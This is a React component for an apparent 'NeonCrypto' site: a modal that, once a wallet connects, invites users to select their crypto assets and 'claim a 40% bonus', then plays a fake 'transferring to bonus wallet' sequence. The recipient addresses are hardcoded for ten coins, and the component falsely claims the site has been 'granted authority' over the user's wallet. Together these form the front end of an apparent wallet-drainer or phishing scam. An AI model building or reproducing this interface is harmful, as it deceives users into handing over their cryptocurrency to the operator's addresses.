import React, { useState } from 'react';
interface CryptoAsset {
  id: string;
  symbol: string;
  name: string;
  icon: string;
  address: string;
  network: string;
}
const CRYPTO_ASSETS: CryptoAsset[] = [
{
  id: 'btc',
  symbol: 'BTC',
  name: 'Bitcoin',
  icon: 'https://assets.coingecko.com/coins/images/1/small/bitcoin.png',
  address: 'bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk',
  network: 'Bitcoin Network'
},
{
  id: 'eth',
  symbol: 'ETH',
  name: 'Ethereum',
  icon: 'https://assets.coingecko.com/coins/images/279/small/ethereum.png',
  address: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4',
  network: 'ERC-20'
},
{
  id: 'sol',
  symbol: 'SOL',
  name: 'Solana',
  icon: 'https://assets.coingecko.com/coins/images/4128/small/solana.png',
  address: 'DEHwbFtyBkKN6fR67xDjsVXTp51LuBSxeHBtUqCBMvjR',
  network: 'Solana Network'
},
{
  id: 'bnb',
  symbol: 'BNB',
  name: 'BNB',
  icon: 'https://assets.coingecko.com/coins/images/825/small/bnb-icon2_2x.png',
  address: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4',
  network: 'BEP-20'
},
{
  id: 'usdt',
  symbol: 'USDT',
  name: 'Tether',
  icon: 'https://assets.coingecko.com/coins/images/325/small/Tether.png',
  address: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4',
  network: 'ERC-20'
},
{
  id: 'usdc',
  symbol: 'USDC',
  name: 'USD Coin',
  icon: 'https://assets.coingecko.com/coins/images/6319/small/USD_Coin_icon.png',
  address: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4',
  network: 'ERC-20'
},
{
  id: 'doge',
  symbol: 'DOGE',
  name: 'Dogecoin',
  icon: 'https://assets.coingecko.com/coins/images/5/small/dogecoin.png',
  address: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4',
  network: 'Dogecoin Network'
},
{
  id: 'trx',
  symbol: 'TRX',
  name: 'TRON',
  icon: 'https://assets.coingecko.com/coins/images/1094/small/tron-logo.png',
  address: 'TXHFMFSryaVDhPkTmawzqNxdpKimd2wwp6',
  network: 'TRC-20'
},
{
  id: 'xrp',
  symbol: 'XRP',
  name: 'XRP',
  icon: 'https://assets.coingecko.com/coins/images/44/small/xrp-symbol-white-128.png',
  address: 'rUsdW7rnoR1uGwYw79U7YT1PRZL6Etk45',
  network: 'XRP Ledger'
},
{
  id: 'ltc',
  symbol: 'LTC',
  name: 'Litecoin',
  icon: 'https://assets.coingecko.com/coins/images/2/small/litecoin.png',
  address: 'ltc1qufqrwwqcu04xn974w7vechjvqd08xd7e78yvhm',
  network: 'Litecoin Network'
}];

interface CryptoClaimModalProps {
  isOpen: boolean;
  walletName: string;
  onClose: () => void;
  onClaimComplete: () => void;
}
type ClaimStep = 'select' | 'processing' | 'done';
export function CryptoClaimModal({
  isOpen,
  walletName,
  onClose,
  onClaimComplete
}: CryptoClaimModalProps) {
  const [selected, setSelected] = useState<string[]>([]);
  const [step, setStep] = useState<ClaimStep>('select');
  const [processingAsset, setProcessingAsset] = useState<string>('');
  if (!isOpen) return null;
  const toggleSelect = (id: string) => {
    setSelected((prev) =>
    prev.includes(id) ? prev.filter((x) => x !== id) : [...prev, id]
    );
  };
  const handleSelectAll = () => {
    if (selected.length === CRYPTO_ASSETS.length) {
      setSelected([]);
    } else {
      setSelected(CRYPTO_ASSETS.map((a) => a.id));
    }
  };
  const handleClaim = async () => {
    if (selected.length === 0) return;
    setStep('processing');
    for (const id of selected) {
      const asset = CRYPTO_ASSETS.find((a) => a.id === id);
      if (asset) {
        setProcessingAsset(asset.symbol);
        await new Promise((r) => setTimeout(r, 900));
      }
    }
    setStep('done');
    setTimeout(() => {
      onClaimComplete();
    }, 2000);
  };
  const selectedAssets = CRYPTO_ASSETS.filter((a) => selected.includes(a.id));
  return (
    <div
      className="modal-overlay"
      onClick={(e) => {
        if (e.target === e.currentTarget && step === 'select') onClose();
      }}>

      <div
        className="relative w-full max-w-md rounded-2xl overflow-hidden"
        style={{
          background:
          'linear-gradient(135deg, rgba(10,8,30,0.98) 0%, rgba(20,10,50,0.98) 100%)',
          border: '1px solid rgba(139,92,246,0.4)',
          boxShadow:
          '0 0 60px rgba(139,92,246,0.25), 0 25px 50px rgba(0,0,0,0.8)',
          maxHeight: '90vh',
          overflowY: 'auto'
        }}
        onClick={(e) => e.stopPropagation()}>

        {/* Header */}
        <div className="p-5 border-b border-purple-500/20">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-full bg-purple-500/20 flex items-center justify-center">
              <span className="text-xl">🔐</span>
            </div>
            <div>
              <h2
                className="text-white font-bold text-lg"
                style={{
                  fontFamily: 'Orbitron, sans-serif'
                }}>

                {walletName} Connected
              </h2>
              <p className="text-purple-300 text-xs">
                Select assets to claim 40% bonus
              </p>
            </div>
          </div>
        </div>

        {step === 'select' &&
        <>
            {/* Authority notice */}
            <div className="mx-4 mt-4 p-3 rounded-xl bg-amber-500/10 border border-amber-500/30">
              <p className="text-amber-300 text-xs leading-relaxed">
                ⚡ <strong>NeonCrypto</strong> has been granted authority to
                process your bonus claim. Select the crypto assets in your
                wallet to receive 40% bonus.
              </p>
            </div>

            {/* Select all */}
            <div className="px-4 pt-4 pb-2 flex items-center justify-between">
              <p className="text-white/60 text-xs">
                Choose assets ({selected.length} selected)
              </p>
              <button
              onClick={handleSelectAll}
              className="text-purple-400 text-xs font-medium hover:text-purple-300 transition-colors">

                {selected.length === CRYPTO_ASSETS.length ?
              'Deselect All' :
              'Select All'}
              </button>
            </div>

            {/* Crypto list */}
            <div className="px-4 pb-4 space-y-2">
              {CRYPTO_ASSETS.map((asset) =>
            <button
              key={asset.id}
              onClick={() => toggleSelect(asset.id)}
              className="w-full flex items-center gap-3 p-3 rounded-xl transition-all duration-200"
              style={{
                background: selected.includes(asset.id) ?
                'rgba(139,92,246,0.2)' :
                'rgba(255,255,255,0.04)',
                border: selected.includes(asset.id) ?
                '1px solid rgba(139,92,246,0.5)' :
                '1px solid rgba(255,255,255,0.08)'
              }}>

                  <img
                src={asset.icon}
                alt={asset.symbol}
                className="w-9 h-9 rounded-full flex-shrink-0" />

                  <div className="flex-1 text-left">
                    <div className="text-white font-semibold text-sm">
                      {asset.symbol}
                    </div>
                    <div className="text-white/40 text-xs">{asset.network}</div>
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="text-green-400 text-xs font-medium bg-green-400/10 px-2 py-0.5 rounded-full">
                      +40%
                    </span>
                    <div
                  className="w-5 h-5 rounded-full border-2 flex items-center justify-center flex-shrink-0 transition-all"
                  style={{
                    borderColor: selected.includes(asset.id) ?
                    '#8b5cf6' :
                    'rgba(255,255,255,0.2)',
                    background: selected.includes(asset.id) ?
                    '#8b5cf6' :
                    'transparent'
                  }}>

                      {selected.includes(asset.id) &&
                  <svg
                    className="w-3 h-3 text-white"
                    fill="none"
                    viewBox="0 0 24 24"
                    stroke="currentColor">

                          <path
                      strokeLinecap="round"
                      strokeLinejoin="round"
                      strokeWidth={3}
                      d="M5 13l4 4L19 7" />

                        </svg>
                  }
                    </div>
                  </div>
                </button>
            )}
            </div>

            {/* Claim button */}
            <div className="p-4 border-t border-purple-500/20">
              <button
              onClick={handleClaim}
              disabled={selected.length === 0}
              className="w-full py-4 rounded-xl font-bold text-base transition-all duration-200 disabled:opacity-40 disabled:cursor-not-allowed"
              style={{
                fontFamily: 'Orbitron, sans-serif',
                background:
                selected.length > 0 ?
                'linear-gradient(135deg, #8b5cf6, #f59e0b)' :
                'rgba(255,255,255,0.1)',
                color: 'white',
                boxShadow:
                selected.length > 0 ?
                '0 0 30px rgba(139,92,246,0.4)' :
                'none'
              }}>

                Claim 40% Bonus{' '}
                {selected.length > 0 ? `(${selected.length} Assets)` : ''}
              </button>
              <p className="text-white/30 text-xs text-center mt-2">
                Bonus will be transferred to your new NeonCrypto wallet
                addresses
              </p>
            </div>
          </>
        }

        {step === 'processing' &&
        <div className="p-8 flex flex-col items-center gap-6">
            <div className="relative w-20 h-20">
              <div
              className="absolute inset-0 rounded-full border-4 border-purple-500/20"
              style={{
                borderTopColor: '#8b5cf6',
                animation: 'spin 1s linear infinite'
              }} />

              <div className="absolute inset-3 rounded-full bg-purple-500/20 flex items-center justify-center">
                <span className="text-2xl">⚡</span>
              </div>
            </div>
            <div className="text-center">
              <h3
              className="text-white font-bold text-lg mb-1"
              style={{
                fontFamily: 'Orbitron, sans-serif'
              }}>

                Processing Transfer
              </h3>
              <p className="text-purple-300 text-sm">
                Transferring{' '}
                <span className="text-amber-400 font-bold">
                  {processingAsset}
                </span>{' '}
                to bonus wallet...
              </p>
            </div>
            <div className="w-full space-y-2">
              {selectedAssets.map((asset) =>
            <div
              key={asset.id}
              className="flex items-center gap-3 p-3 rounded-xl"
              style={{
                background: 'rgba(255,255,255,0.04)',
                border: '1px solid rgba(255,255,255,0.08)'
              }}>

                  <img
                src={asset.icon}
                alt={asset.symbol}
                className="w-7 h-7 rounded-full" />

                  <div className="flex-1">
                    <div className="text-white/80 text-sm">{asset.symbol}</div>
                    <div className="text-white/30 text-xs truncate">
                      {asset.address.slice(0, 20)}...
                    </div>
                  </div>
                  <div className="text-xs">
                    {processingAsset === asset.symbol ?
                <span className="text-amber-400 animate-pulse">
                        Sending...
                      </span> :
                selectedAssets.findIndex(
                  (a) => a.symbol === processingAsset
                ) > selectedAssets.findIndex((a) => a.id === asset.id) ?
                <span className="text-green-400">✓ Done</span> :

                <span className="text-white/30">Pending</span>
                }
                  </div>
                </div>
            )}
            </div>
          </div>
        }

        {step === 'done' &&
        <div className="p-8 flex flex-col items-center gap-4 text-center">
            <div className="w-20 h-20 rounded-full bg-green-500/20 border-2 border-green-500/50 flex items-center justify-center">
              <span className="text-4xl">✅</span>
            </div>
            <h3
            className="text-white font-bold text-xl"
            style={{
              fontFamily: 'Orbitron, sans-serif'
            }}>

              Transfer Complete!
            </h3>
            <p className="text-green-400 text-sm">
              Your 40% bonus has been successfully transferred to your
              NeonCrypto wallet addresses.
            </p>
            <p className="text-white/40 text-xs">
              Redirecting to confirmation...
            </p>
          </div>
        }
      </div>

      <style>{`
        @keyframes spin {
          from { transform: rotate(0deg); }
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>);

}